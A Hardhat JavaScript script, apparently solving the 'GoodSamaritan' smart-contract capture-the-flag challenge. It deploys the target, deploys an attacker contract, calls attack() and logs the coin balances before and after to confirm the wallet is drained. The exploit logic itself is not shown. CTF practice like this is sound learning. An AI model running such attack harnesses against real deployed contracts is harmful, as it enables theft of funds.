
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1, deployer1] = await hre.ethers.getSigners();

    const contract = await hre.ethers.deployContract("GoodSamaritan", signer0);
    const walletAddress = await contract.wallet();
    const coinAddress = await contract.coin();
    const wallet = await hre.ethers.getContractAt("Wallet", walletAddress, signer0);
    const coin = await hre.ethers.getContractAt("Coin", coinAddress, signer0);

    // const contract = await hre.ethers.getContractAt("GoodSamaritan", "0x7cd5d1eDDb94F2B5567e8c48e0AD360fc66002e8", deployer);
    // const walletAddress = await contract.wallet();
    // const coin = await hre.ethers.getContractAt("Coin", await contract.coin(), deployer);

    const testContract = await hre.ethers.deployContract("TestSamaritan", [contract.address], deployer);
    console.log("Contract balance before:", await coin.balances(walletAddress));
    console.log("Attacker balance before:", await coin.balances(testContract.address));
    await testContract.attack();
    console.log("Contract balance after:", await coin.balances(walletAddress));
    console.log("Attacker balance after:", await coin.balances(testContract.address));


}


main()
